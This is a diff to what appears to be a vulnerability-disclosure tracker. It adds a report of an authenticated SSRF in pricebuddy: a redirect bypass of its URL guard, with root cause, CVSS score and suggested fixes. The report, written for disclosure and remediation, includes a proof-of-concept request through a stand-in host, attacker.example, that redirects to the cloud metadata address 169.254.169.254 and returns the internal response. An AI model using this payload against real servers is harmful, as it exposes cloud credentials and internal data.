@@ -2,7 +2,7 @@
 
 Channel: https://vulncheck.com/advisories/report  |  disclosures@vulncheck.com
 Reporter (all): Abdulloh Nuriddinov (GitHub: 4bdull0hh) — abdullohnuriddinov677@gmail.com
-Status: all 6 ☐ not submitted. All source review of public code; one runtime-confirmed, others as noted.
+Status: all 7 ☐ not submitted. All source review of public code; several runtime-confirmed, others as noted.
 
 ================================================================================
 ## Vulnerability 1
@@ -135,3 +135,25 @@ Suggested fix: Ship `RELAY_ALLOW_PRIVATE_IP = false`; allow-list `url` to Kuwo C
 Caveat: Part A confirmed at runtime on the unmodified file; Part B proven as a property of the project's own ciphers (so, with attacker control of `ekey`, bytes are recoverable). A full end-to-end read of real cloud metadata through a live cloud host was not run; redirect-follow and DNS-rebind bypasses are identified from code, not separately scripted.
 Write-up: security-research/kuwo-music-relay-unauth-ssrf.md
 Packet: security-research/VULNCHECK-SUBMISSION-6-kuwo-relay-ssrf.md
+
+================================================================================
+## Vulnerability 7
+================================================================================
+
+Title: pricebuddy authenticated SSRF via redirect bypass of the PublicHttpUrl guard (/api/meta-extraction)
+Reporter: Abdulloh Nuriddinov (GitHub: 4bdull0hh)
+Contact: abdullohnuriddinov677@gmail.com
+Supplier: jez500
+Product: pricebuddy (self-hosted price tracker, Laravel + Filament) + bundled dep jez500/web-scraper-for-laravel ^1.0.9
+Source: https://github.com/jez500/pricebuddy  (dep: https://github.com/jez500/web-scraper-for-laravel)
+Affected version: main @ 34f2b2f7ca3b9853d83ec686e46ad74fc0f21e12 (2026-10-05); app version string "development"
+Vulnerability type: CWE-918 (Server-Side Request Forgery) — anti-SSRF guard bypassed by HTTP redirect-follow (validate-once/fetch-follows-redirects); also DNS-rebinding TOCTOU
+Authentication: Authenticated — Sanctum API token with the meta-extraction:extract ability
+CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L -> ~7.1 (High)
+Impact: An authenticated user makes the server fetch arbitrary internal/cloud URLs (169.254.169.254, 127.0.0.1, internal APIs) despite the PublicHttpUrl guard. Readable: the same request supplies the extraction strategy (store.scrape_strategy.title.value as regex/xpath/json), so chosen slices of the internal response are returned in title/price/image.
+Root cause: POST /api/meta-extraction validates url with App\Rules\PublicHttpUrl (resolves host, blocks reserved ranges) but only on the INITIAL url. The fetch (jez500/web-scraper-for-laravel: HttpDriver::fetch -> Http::...->get($url), no ->withoutRedirecting()) follows redirects (Guzzle default, up to 5 hops) and never re-checks the redirect target. A public attacker host that 302s to an internal address is fetched. DNS rebinding also bypasses (validate-time resolve vs fetch-time resolve).
+Proof of concept: POST /api/meta-extraction {"url":"http://attacker.example/landing","store":{"domains":[{"domain":"attacker.example"}],"scrape_strategy":{"title":{"type":"regex","value":"(?s)(.*)"}}}} -> attacker.example passes the validator and 302s to http://169.254.169.254/latest/meta-data/... -> scraper follows and returns the internal body in title. Runtime-demonstrated: real PublicHttpUrl passes 8.8.8.8 and blocks 127.0.0.1/localhost/169.254.169.254/[::1]; a 302 from the submitted host to an internal target is followed (body leaked) while a no-follow fetch leaks nothing.
+Suggested fix: disable redirect following on the scraper HTTP client, or re-run PublicHttpUrl on every redirect Location (Guzzle on_redirect); resolve once and pin the connection to the vetted public IP to defeat DNS rebinding; apply the same to the scraper:3000 microservice path.
+Caveat: authenticated (needs an API token with the ability); code path confirmed by reading pricebuddy + the vendored scraper package; validator verdicts and redirect-follow demonstrated at runtime; full end-to-end run against a live instance not performed (needs provisioned DB/token). Sandbox has no outbound DNS / cannot bind a public IP, so the public host is represented on loopback and public IPs given as literals.
+Write-up: security-research/pricebuddy-ssrf-redirect-bypass.md
+Packet: security-research/VULNCHECK-SUBMISSION-7-pricebuddy-ssrf.md
